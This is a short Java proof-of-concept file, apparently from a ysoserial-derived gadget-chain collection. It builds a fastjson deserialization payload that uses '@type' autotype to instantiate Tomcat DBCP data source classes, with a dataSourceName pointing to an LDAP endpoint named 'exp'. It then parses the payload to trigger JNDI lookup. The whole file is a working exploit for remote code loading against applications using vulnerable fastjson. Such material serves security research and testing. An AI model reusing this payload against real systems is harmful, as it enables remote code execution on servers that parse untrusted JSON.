package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc1 {
    public static void main(String[] args) {
       String poc=  "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"dataSource\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSource\",\"dataSourceName\":\"ldap://127.0.0.1:8990/exp\"}}";
       JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
